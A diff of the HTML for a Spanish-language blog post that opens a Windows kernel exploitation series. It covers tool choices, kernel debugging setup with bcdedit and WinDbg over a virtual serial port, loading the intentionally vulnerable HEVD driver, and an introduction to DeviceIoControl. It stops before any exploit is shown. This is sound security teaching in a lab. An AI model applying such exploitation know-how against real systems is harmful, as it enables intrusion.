+  <header id="single_header" class="mt-5 max-w-prose">
+    
+    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+      0x00 - Introducción a Windows Kernel Explotación
+    </h1>
+    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+      
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+  <span title="Reading time">17 mins</span>
+  
+
+  
+  
+</div>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+        
+      
+      <img class="!mt-0 !mb-0 h-24 w-24 rounded-full ltr:mr-4 rtl:ml-4" width="96" height="96"
+      alt="wetw0rk" src="/img/me_hu16849291692863915239.png" />
+    
+  
+  <div class="place-self-center">
+    
+    <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+      Author
+    </div>
+    <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+      wetw0rk
+    </div>
+    
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://bsky.app/profile/wetw0rk.bsky.social"
+          target="_blank"
+          aria-label="Bluesky"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256,232.562c-21.183,-41.196 -78.868,-117.97 -132.503,-155.834c-51.378,-36.272 -70.978,-29.987 -83.828,-24.181c-14.872,6.72 -17.577,29.554 -17.577,42.988c0,13.433 7.365,110.138 12.169,126.281c15.873,53.336 72.376,71.358 124.413,65.574c2.66,-0.395 5.357,-0.759 8.089,-1.097c-2.68,0.429 -5.379,0.796 -8.089,1.097c-76.259,11.294 -143.984,39.085 -55.158,137.972c97.708,101.165 133.908,-21.692 152.484,-83.983c18.576,62.291 39.972,180.718 150.734,83.983c83.174,-83.983 22.851,-126.674 -53.408,-137.969c-2.71,-0.302 -5.409,-0.667 -8.089,-1.096c2.732,0.337 5.429,0.702 8.089,1.096c52.037,5.785 108.54,-12.239 124.413,-65.574c4.804,-16.142 12.169,-112.847 12.169,-126.281c-0,-13.434 -2.705,-36.267 -17.577,-42.988c-12.85,-5.806 -32.45,-12.09 -83.829,24.181c-53.634,37.864 -111.319,114.635 -132.502,155.831Z"/></svg>
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/wetw0rk"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/milton-wetw0rk/"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://x.com/wetw0rk_bot"
+          target="_blank"
+          aria-label="X-Twitter"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+  </div>
+</div>
+
+      
+
+      
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+    
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>Esta publicación será la primera de un series donde te guiaré al mundo de Windows Kernel Explotación. Mi papa antes dicia, &ldquo;no se nace aprendido&rdquo;. Como todo en la vida hay que empezar por algún lado. El objetivo de esta series es comenzar en Windows 7 (x86) y terminar en Windows 11 (x64). Hoy vamos usar Windows 7 (x86) y Windows 10 (x64).</p>
 <p>Para empezar, baja estos programas:</p>
 <ul>
-<li><a href="https://youtu.be/wX75Z-4MEoM?si=JgQvGaH5QF0ptqI4">Programa de Virtualización</a>: Esto puede ser cualquier desde VirtualBox a VMWare. Dejaré cual programa de virtualización usar en tus manos.</li>
-<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools">WinDbg</a>: Esta aplicación nos servirá como instrumento para interactuar con el Kernel, es importante que lo bajes de el Windows Driver Kit y NO el WinDbg Preview para este serie.</li>
-<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HEVD</a>: Para este series usaré HEVD v3.00 para demosrar las vulnerabilidades. Al escribir este series, es el versión mas nuevo. HEVD es un controlador (driver) programado para ser intencionalmente vulnerable.</li>
-<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm">OSRLOADER</a>: Como HEVD is un controlador, necesitamos una forma de cargarlo en el sistema de operación. Para hacer esto usaremos la aplicación OSRLOADER.</li>
-<li><a href="https://www.python.org/">Python</a>: Al escribir esto, usé versión 3.11.5 sin embargo, cualquier versión debería estar bien.</li>
-<li><a href="https://ghidra-sre.org/">Ghidra</a>: Ghidra será nuestra herramienta para conducta ingeniería inversa (reverse engineering). Si tienes IDA Pro, estas bienvenido a usarlo :)</li>
-<li><a href="https://github.com/wetw0rk/Sickle">Sickle</a>: Esta será la herramienta que utilizaremos para generar shellcode. Si estás leyendo esto en 2024, es probable que el nuevo versión no esta listo. Por esta razón, usa la última rama no la versión mas nueva (simplemente clona el repositorio).</li>
+<li><a href="https://youtu.be/wX75Z-4MEoM?si=JgQvGaH5QF0ptqI4" target="_blank">Programa de Virtualización</a>: Esto puede ser cualquier desde VirtualBox a VMWare. Dejaré cual programa de virtualización usar en tus manos.</li>
+<li><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools" target="_blank">WinDbg</a>: Esta aplicación nos servirá como instrumento para interactuar con el Kernel, es importante que lo bajes de el Windows Driver Kit y NO el WinDbg Preview para este serie.</li>
+<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank">HEVD</a>: Para este series usaré HEVD v3.00 para demosrar las vulnerabilidades. Al escribir este series, es el versión mas nuevo. HEVD es un controlador (driver) programado para ser intencionalmente vulnerable.</li>
+<li><a href="https://www.osronline.com/article.cfm%5Earticle=157.htm" target="_blank">OSRLOADER</a>: Como HEVD is un controlador, necesitamos una forma de cargarlo en el sistema de operación. Para hacer esto usaremos la aplicación OSRLOADER.</li>
+<li><a href="https://www.python.org/" target="_blank">Python</a>: Al escribir esto, usé versión 3.11.5 sin embargo, cualquier versión debería estar bien.</li>
+<li><a href="https://ghidra-sre.org/" target="_blank">Ghidra</a>: Ghidra será nuestra herramienta para conducta ingeniería inversa (reverse engineering). Si tienes IDA Pro, estas bienvenido a usarlo :)</li>
+<li><a href="https://github.com/wetw0rk/Sickle" target="_blank">Sickle</a>: Esta será la herramienta que utilizaremos para generar shellcode. Si estás leyendo esto en 2024, es probable que el nuevo versión no esta listo. Por esta razón, usa la última rama no la versión mas nueva (simplemente clona el repositorio).</li>
 </ul>
 <p>Es importante saber, he estructurado estas guías para llevarte de Exploit Developer a Kernel Exploit Developer. Si nunca has escrito una cadena de ROP, o estas completamente perdido con protecciones de la memoria moderna. Te recomiendo que empezes con explotación de Userland.</p>
 <p>Si no tienes dinero, te recomiendo lo siguiente:</p>
 <ul>
-<li><a href="https://www.corelan.be/index.php/search/exploit+writing+tutorial+part+1/">Corelan Tutorials</a>: Corelan fue una de mis inspiraciones para hacer estas publicaciones. Cuando comencé mi viaje por primera vez en Exploit Development yo leí tutoriales 1-11. Todo presentado en ellos sigue siendo relevante a haste día. No dejes que la falta de sistemas modernas te detenga, conceptos de Windows XP se aplica a Windows 11.</li>
-<li><a href="https://github.com/wetw0rk/MBE-NOTES">Modern Binary Exploitation</a>: Este es un curso escrito por los creadores de RET2 publicada gratis. Con el permiso de los autores del curso, tambien publiqué mis notas en GitHub. Una vez más, esto es para sistemas más antiguos de Linux (x86), pero el conocimiento es transferible.</li>
+<li><a href="https://www.corelan.be/index.php/search/exploit&#43;writing&#43;tutorial&#43;part&#43;1/" target="_blank">Corelan Tutorials</a>: Corelan fue una de mis inspiraciones para hacer estas publicaciones. Cuando comencé mi viaje por primera vez en Exploit Development yo leí tutoriales 1-11. Todo presentado en ellos sigue siendo relevante a haste día. No dejes que la falta de sistemas modernas te detenga, conceptos de Windows XP se aplica a Windows 11.</li>
+<li><a href="https://github.com/wetw0rk/MBE-NOTES" target="_blank">Modern Binary Exploitation</a>: Este es un curso escrito por los creadores de RET2 publicada gratis. Con el permiso de los autores del curso, tambien publiqué mis notas en GitHub. Una vez más, esto es para sistemas más antiguos de Linux (x86), pero el conocimiento es transferible.</li>
 </ul>
 <p>Si prefieres algo más moderno, y puedes, te recomiendo estos cursos:</p>
 <ul>
-<li><a href="https://www.corelan-training.com/">Corelan Training</a>: Corelan también ofrece cursos para systemas modernas. Así que si prefieres pagar, la clase de <code>Expert Level Stack</code> debería ser un comienzo sólido para explotación de Windows. Yo tomé su <code>Heap Masterclass</code> en 2019 y planeo tomarlo de nuevo.</li>
-<li><a href="https://wargames.ret2.systems/">RET2 Wargames</a>: RET2 Wargames es un curso que tomé y completé en 2024. No puedo decir lo suficiente, este curso lo recomiendo. Además, una vez completé el curso, me comuniqué con los autores del curso y me permitieron publicar mis notas sobre su antiguo curso MBE. Si esto no es suficiente para apoyarlos, yo escribí en mi experiencia <a href="https://www.linkedin.com/pulse/ret2-systems-wargames-review-milton-valencia-0udrf/">&gt;aqi&lt;</a></li>
+<li><a href="https://www.corelan-training.com/" target="_blank">Corelan Training</a>: Corelan también ofrece cursos para systemas modernas. Así que si prefieres pagar, la clase de <code>Expert Level Stack</code> debería ser un comienzo sólido para explotación de Windows. Yo tomé su <code>Heap Masterclass</code> en 2019 y planeo tomarlo de nuevo.</li>
+<li><a href="https://wargames.ret2.systems/" target="_blank">RET2 Wargames</a>: RET2 Wargames es un curso que tomé y completé en 2024. No puedo decir lo suficiente, este curso lo recomiendo. Además, una vez completé el curso, me comuniqué con los autores del curso y me permitieron publicar mis notas sobre su antiguo curso MBE. Si esto no es suficiente para apoyarlos, yo escribí en mi experiencia <a href="https://www.linkedin.com/pulse/ret2-systems-wargames-review-milton-valencia-0udrf/" target="_blank">&gt;aqi&lt;</a></li>
 </ul>
 <p>Que yo sepa, estos cursos son sólo en inglés. Sin embargo, sé que el lenguaje de programación es universal. Con eso, podemos comenzar!</p>
-<h1 id="table-of-contents">Table of Contents</h1>
+
+
+<h1 class="relative group">Table of Contents 
+    <div id="table-of-contents" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#table-of-contents" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
 <ul>
 <li><a href="#trabajando-con-el-kernel-y-windbg">Trabajando con el Kernel y WinDbg</a>
 <ul>
 <li><a href="#preparando-la-computadora-que-vamos-a-atacar-debugee">Preparando la Computadora Que Vamos a Atacar (Debugee)</a></li>
-<li><a href="#configurando-el-sistema-de-virtualizaci%C3%B3n">Configurando el Sistema de Virtualización</a></li>
+<li><a href="#configurando-el-sistema-de-virtualizaci%c3%b3n">Configurando el Sistema de Virtualización</a></li>
 <li><a href="#configurar-la-host-computadora-debugger">Configurar la &ldquo;host&rdquo; Computadora (Debugger)</a></li>
 </ul>
 </li>
-<li><a href="#introducci%C3%B3n-a-hevd">Introducción a HEVD</a>
+<li><a href="#introducci%c3%b3n-a-hevd">Introducción a HEVD</a>
 <ul>
 <li><a href="#trabajando-con-conductores-de-sistemas">Trabajando con Conductores de Sistemas</a></li>
 <li><a href="#trabajando-con-hevd-ghidra-y-windbg">Trabajando con HEVD, Ghidra y WinDbg</a></li>
 </ul>
 </li>
-<li><a href="#explotaci%C3%B3n-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</a>
+<li><a href="#explotaci%c3%b3n-de-un-stack-overflow-windows-7---x86">Explotación de un &ldquo;Stack Overflow&rdquo; (Windows 7 - x86)</a>
 <ul>
 <li><a href="#identificando-la-vulnerabilidad">Identificando la Vulnerabilidad</a></li>
 <li><a href="#entendiendo-bufferoverflowstackioctlhandler">Entendiendo BufferOverflowStackIoctlHandler</a></li>
@@ -119,9 +960,31 @@ Programa de Virtualización: Esto puede ser cualquier desde VirtualBox a VMWare.
 </li>
 <li><a href="#recursos">Recursos</a></li>
 </ul>
-<h1 id="trabajando-con-el-kernel-y-windbg">Trabajando con el Kernel y WinDbg</h1>
+
+
+<h1 class="relative group">Trabajando con el Kernel y WinDbg 
+    <div id="trabajando-con-el-kernel-y-windbg" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#trabajando-con-el-kernel-y-windbg" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
 <p>Al leer este tutorial, es importante que reconozcas dos definiciones. Primero, la computadora donde vamos a estar trabajando se llama la <code>host computer</code> o <code>debugger machine</code>. Mientras, la computadora que vamos a depurar, se llama la <code>target computer</code> o <code>debugee machine</code>. El sistema <code>debugee machine</code>, estará dentro de un programa de virtualización.</p>
-<h2 id="preparando-la-computadora-que-vamos-a-atacar-debugee">Preparando la Computadora Que Vamos a Atacar (Debugee)</h2>
+
+
+<h2 class="relative group">Preparando la Computadora Que Vamos a Atacar (Debugee) 
+    <div id="preparando-la-computadora-que-vamos-a-atacar-debugee" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#preparando-la-computadora-que-vamos-a-atacar-debugee" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Para empezar, encende el debugee machine y abre el &ldquo;command prompt&rdquo; con permisos de un administrador y ejecuta lo siguiente:</p>
 <pre tabindex="0"><code>C:\Windows\system32&gt;bcdedit /copy {current} /d &#34;Kernel Debugging On&#34;
 The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}.
@@ -129,472 +992,1040 @@ The entry was successfully copied to {3709675a-4632-11ee-b00a-b3e46a698b2a}.
 C:\Windows\system32&gt;bcdedit /debug {3709675a-4632-11ee-b00a-b3e46a698b2a} on
 The operation completed successfully.
 </code></pre><p>Esto generará una entrada en la &ldquo;boot table&rdquo; que tiene la habilitada de depuración (debug). Nosotras podemos confirmar esto ejecutando <code>bcdedit</code>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/boot.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/boot.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Después de crear la entrada (ahora tiene la habilidad de depurar o &ldquo;debug&rdquo;), abre la aplicación <code>System Configuration</code>. Una vez lo has abierto, ve a la pestaña de <code>Boot</code>. Clicia en la entrada recién agregada y clickia <code>Advanced Options...</code>. Después copia los ajustes como demuestro aqi (yo usé &ldquo;COM2&rdquo;). Es importante que el &ldquo;baud rate&rdquo; está sincronizado con el <code>host computer</code> que configuraremos para ser 115200.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/com_two.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/com_two.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Clickia <code>OK</code>, <code>Apply</code>, <code>OK</code>, después encender y apaga el sistema de virtualización (VM).</p>
-<h2 id="configurando-el-sistema-de-virtualización">Configurando el Sistema de Virtualización</h2>
+
+
+<h2 class="relative group">Configurando el Sistema de Virtualización 
+    <div id="configurando-el-sistema-de-virtualizaci%C3%B3n" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#configurando-el-sistema-de-virtualizaci%C3%B3n" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Apaga el VM, después ábre la configuración de el VM y agregar un &ldquo;Serial Port&rdquo;, una vez añadido, utilice la configuración presentada aquí:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/vmware.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/vmware.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>La próxima vez que lo arranques, clicia la nueva entrada; sin embargo ahora podemos pasar al siguiente paso.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry.png" alt="alt text"></p>
-<h2 id="configurar-la-host-computadora-debugger">Configurar la &ldquo;host&rdquo; Computadora (Debugger)</h2>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/entry.png" alt="alt text" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">Configurar la &ldquo;host&rdquo; Computadora (Debugger) 
+    <div id="configurar-la-host-computadora-debugger" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#configurar-la-host-computadora-debugger" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Suponiendo que la <code>target computer</code> fue configurada correctamente, abre el <code>WinDbg</code> apropiado, en mi caso <code>WinDbg (x64)</code>. Una vez abierto, clicia <code>File</code> y <code>Kernel Debug...</code>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/kernel_host.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/kernel_host.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Una vez lo as seleccionado, una ventana se va abrir, vete a la pestaña <code>COM</code> y escribir lo siguiente (cómo programaste tu configuración):</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/port.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/port.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Luego presiona &ldquo;OK&rdquo;. Si no lo has hecho, arrancar la computadora que vas atacar y una vez que hayamos entrado a la nueva entrada que creamos antes, deberías ver lo siguiente:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/done.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/done.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Pon te orgulloso, as configurado tu primer &ldquo;Kernel Debugger&rdquo;! Ahora&hellip; como ejercicio, hazlo de nuevo en Windows 7.</p>
-<h1 id="introducción-a-hevd">Introducción a HEVD</h1>
+
+
+<h1 class="relative group">Introducción a HEVD 
+    <div id="introducci%C3%B3n-a-hevd" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introducci%C3%B3n-a-hevd" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
 <p>Has aprendido como configurar &ldquo;kernel debugging&rdquo;, con eso, confirmar que as bajado HEVD, OSRLOADER, y Python a el <code>target computer</code> or <code>debugee machine</code>.</p>
 <p>La primera ves que abres HEVD, vas a ejecutar <code>OSRLOADER.exe</code>, asegúrete ejecutarlo como administrador. Deberías ver lo siguiente:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/osrloader.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/osrloader.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Una vez ejecutado, clicia <code>Browse</code> y ve al HEVD conductor adecuado y abre lo.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/loadit.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/loadit.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>En orden para asegurar que el conductor se va ejecutar cuando arrancamos la computadora, selecciona &ldquo;Automatic&rdquo; de la pestaña de la configuración &ldquo;Service Start&rdquo;. Deberías ver lo siguiente:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/success.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/success.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Volviendo a nuestro debugger, si pausas ejecución y listas los módulos cargados, deberías ver HEVD.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/windbg.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/windbg.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Lo siguiente que debemos hacer es arreglar los simbolos.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/sym.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/sym.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Toma nota del camino: <code>C:\projects\hevd\build\driver\vulnerable\x86\HEVD\HEVD.pdb</code> necesitaremos crear lo en el <code>host computer</code>, y copiar todos los documentos a el como demostrado aqi:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/pathsetup.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/pathsetup.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Después, enciende y apaga la máquina. Si todo salio bien, deberías ver lo siguiente:</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/symload.png" alt="alt text"></p>
-<h2 id="trabajando-con-conductores-de-sistemas">Trabajando con Conductores de Sistemas</h2>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/symload.png" alt="alt text" />
+      
+    </figure>
+</p>
+
+
+<h2 class="relative group">Trabajando con Conductores de Sistemas 
+    <div id="trabajando-con-conductores-de-sistemas" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#trabajando-con-conductores-de-sistemas" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
 <p>Conductores de sistemas o &ldquo;Device Drivers&rdquo; son objetos de el Kernel, lo que significa esto es que no podemos modificarlos directamente desde Userland. Para interactuar con los conductores, nosotros necesitamos un HANDLE para ellos. Para hacer esto, necesitamos usar un enlace simbólico como <code>\\Driver</code> y pasar lo a <code>CreateFileA</code>.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/createfilea.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/createfilea.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Una vez que hayamos obtenido un &ldquo;handle&rdquo;, podemos usar la función <code>DeviceIoControl</code> para obtener control sobre los aparatos a través de el entrada y salida (I/O) sobre el interfaz (IOCTL). Esta interfaz, puede mandar códigos de control a el aparato, cada código de control representa una operación para que el aparato lo pueda ejecutar. Por ejemplo, un código de control le puede preguntar el aparato que ejecutar una acción como borrando el disco.</p>
-<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text"></p>
+<p>
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/0x00-Introduction-To-Windows-Kernel-Exploitation/deviceiocontrol.png" alt="alt text" />
+      
+    </figure>
+</p>
 <p>Ate mirar dónde podemos encontrar la información necesaria para realizar estas llamadas dentro de HEVD.</p>
-<h2 id="trabajando-con-hevd-ghidra-y-windbg">Trabajando con HEVD, Ghidra y WinDbg</h2>
+
+
+<h2 class="relative group">Trabajando con HEVD, Ghidra y WinDbg 
+    <div id="trabajando-con-hevd-ghidra-y-windbg" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#trabajando-con-hevd-ghidra-y-windbg" aria-label="Anchor">#</a>
+    </span>        
